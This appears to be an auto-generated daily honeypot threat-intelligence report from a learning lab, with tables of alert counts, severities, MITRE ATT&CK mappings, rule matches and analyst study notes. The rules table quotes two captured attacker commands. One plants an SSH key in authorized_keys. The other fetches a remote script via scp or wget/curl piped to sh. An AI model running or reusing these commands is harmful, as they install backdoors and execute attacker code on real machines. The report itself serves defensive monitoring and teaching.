# LearningLab01 Daily Threat Intelligence Report — 2026-09-26

Generated: 2026-09-26T13:15:05.053Z

Report window: 2026-09-25T13:15:05.021Z through 2026-09-26T13:15:05.021Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 175,144 |
| Attack-related alerts | 14,814 |
| Honeypot interactions | 163,599 |
| Authentication failures | 4,242 |
| Authentication successes | 428 |
| Critical alerts | 122 |
| High alerts | 362 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 122 critical-severity alerts require priority review.
- 362 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 9.91:1.
- Country attribution currently covers only 3.60% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (103,361 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 122 | 0.07% |
| High | 362 | 0.21% |
| Medium | 1,665 | 0.95% |
| Low | 172,995 | 98.77% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 4,242
- Authentication successes: 428
- Failure-to-success ratio: 9.91:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 8,716 | 58.84% |
| Payload delivery | 8,716 | 58.84% |
| Authentication failure | 4,242 | 28.64% |
| Command execution | 1,196 | 8.07% |
| Reconnaissance | 215 | 1.45% |
| Malware | 100 | 0.68% |
| Web attack | 92 | 0.62% |
| SMTP attack | 91 | 0.61% |
| Network scan | 17 | 0.11% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 6,309 alerts, representing 3.60% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 168,835 | 96.40% | Not geolocated |
| Republic of Moldova | 2,907 | 1.66% | ████████████████████ |
| New Zealand | 2,662 | 1.52% | ██████████████████ |
| Germany | 510 | 0.29% | ████ |
| United Kingdom | 145 | 0.08% | █ |
| United States | 35 | 0.02% | █ |
| Taiwan | 20 | 0.01% | █ |
| Russia | 8 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Iraq | 3 | 0.00% | █ |
| Japan | 3 | 0.00% | █ |
| Singapore | 3 | 0.00% | █ |
| Turkey | 3 | 0.00% | █ |
| Ukraine | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Kyrgyzstan | 2 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 303 |
| Defense Evasion | 296 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 85 |
| Execution | 34 |
| Impact | 30 |
| Command and Control | 15 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 85 |
| Command and Scripting Interpreter | 34 |
| Stored Data Manipulation | 26 |
| Ingress Tool Transfer | 15 |
| Exploit Public-Facing Application | 12 |
| Data Destruction | 4 |
| File Deletion | 4 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 103,361 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (103,361) |
| 110207 | 5 | 18,280 | T-Pot SentryPeer SIP activity from [IP address]:51215, method INVITE | tpot (18,280) |
| 110213 | 4 | 13,962 | T-Pot RDP connection from [IP address] to port 3389. | tpot (13,962) |
| 110204 | 4 | 12,081 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (12,081) |
| 110205 | 6 | 8,665 | T-Pot Honeytrap received a payload from [IP address] | tpot (8,665) |
| 110219 | 4 | 6,168 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (6,168) |
| 110101 | 3 | 5,014 | Cowrie SSH connection from [IP address]. | tpot (5,014) |
| 110102 | 5 | 4,242 | Cowrie failed login from [IP address] using username root. | tpot (4,242) |
| 110104 | 7 | 1,061 | Cowrie captured a command from [IP address]: [ -f /etc/os-release ] | tpot (1,061) |
| 110201 | 4 | 392 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (392) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110216 | 4 | 223 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (223) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 169 | PAM: Login session closed. | tpot (168), wazuh (1) |
| 110103 | 10 | 137 | Cowrie accepted login from [IP address] using username root. | tpot (137) |
| 110109 | 13 | 110 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (110) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110223 | 5 | 92 | T-Pot HoneyAML received  request from  to  on port . | tpot (92) |
| 110217 | 7 | 91 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (91) |
| 110106 | 10 | 85 | Cowrie detected repeated failed logins from [IP address]. | tpot (85) |
| 110221 | 7 | 84 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (84) |
| 110105 | 12 | 63 | Cowrie captured a file download from [IP address]. | tpot (63) |
| 110220 | 8 | 56 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (56) |
| 110212 | 10 | 51 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (51) |
| 110215 | 4 | 41 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (41) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110108 | 12 | 22 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (22) |
| 110208 | 7 | 21 | T-Pot SentryPeer detected SIP scanner Friendly-Scanner/1.1 from [IP address]:46824 | tpot (21) |
| 550 | 7 | 15 | Integrity checksum changed. | tpot (15) |
| 110214 | 9 | 13 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (13) |
| 110225 | 13 | 12 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 2904 | 7 | 10 | Dpkg (Debian Package) half configured. | tpot (10) |
| 2902 | 7 | 6 | New dpkg (Debian Package) installed. | tpot (6) |
| 11 | 4 | 4 | Unknown | tpot (4) |
| 110211 | 9 | 4 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (4) |
| 553 | 7 | 4 | File deleted. | tpot (4) |
| 554 | 5 | 4 | File added to the system. | tpot (4) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
